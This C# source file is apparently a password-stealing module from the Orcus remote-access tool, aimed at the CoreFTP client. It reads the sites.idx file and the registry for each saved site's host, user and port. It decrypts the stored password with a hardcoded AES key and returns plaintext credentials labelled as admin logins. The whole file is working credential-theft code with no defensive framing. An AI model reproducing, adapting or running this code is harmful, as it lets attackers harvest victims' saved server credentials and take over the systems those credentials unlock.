using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.CoreFTP
{
    internal class CoreFtp : IPasswordRecovery
    {
        private const string ApplicationName = "CoreFTP";

        public IEnumerable<RecoveredPassword> GetPasswords()
        {
            var sPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "CoreFtp/sites.idx");
            var regBuilder = new StringBuilder();
            using (var reader = new StreamReader(sPath))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    try
                    {
                        regBuilder.Append(line.Split(new[] {"  "}, StringSplitOptions.None)[0] + " ");
                    }
                    catch
                    {
                        // ignored
                    }
                }
            }

            var registryPaths = regBuilder.ToString().Substring(0, regBuilder.ToString().Length - 2).Split(' ');
            foreach (var path in registryPaths)
            {
                var host = Registry.GetValue($@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\{path}",
                    "Host", " ").ToString();
                var user = Registry.GetValue($@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\{path}",
                    "User", " ").ToString();
                var port = Registry.GetValue($@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\{path}",
                    "Port", " ").ToString();
                var password = DecryptCoreFtpPassword(
                    Registry.GetValue($@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\{path}",
                        "PW", " ").ToString());
                if (!string.IsNullOrEmpty(user) && !string.IsNullOrEmpty(port) && !string.IsNullOrEmpty(host))
                {
                    yield return
                        new RecoveredPassword
                        {
                            UserName = user,
                            Password = password,
                            Application = ApplicationName,
                            Field1 = host,
                            Field2 = port,
                            PasswordType = PasswordType.Adminsys
                        };
                }
            }
        }

        private static string DecryptCoreFtpPassword(string hexString)
        {
            var buffer = new StringBuilder(hexString.Length*3/2);
            for (var i = 0; i < hexString.Length; i++)
            {
                if ((i > 0) & (i%2 == 0))
                    buffer.Append("-");
                buffer.Append(hexString[i]);
            }

            var reversed = buffer.ToString();

            var length = (reversed.Length + 1)/3;
            var arr = new byte[length];
            for (var i = 0; i < length; i++)
            {
                arr[i] = Convert.ToByte(reversed.Substring(3*i, 2), 16);
            }

            var aes = new RijndaelManaged
            {
                Mode = CipherMode.ECB,
                Key = Encoding.ASCII.GetBytes("hdfzpysvpzimorhk"),
                Padding = PaddingMode.Zeros
            };
            var transform = aes.CreateDecryptor(aes.Key, aes.IV);
            return Encoding.UTF8.GetString(transform.TransformFinalBlock(arr, 0, arr.Length));
        }
    }
}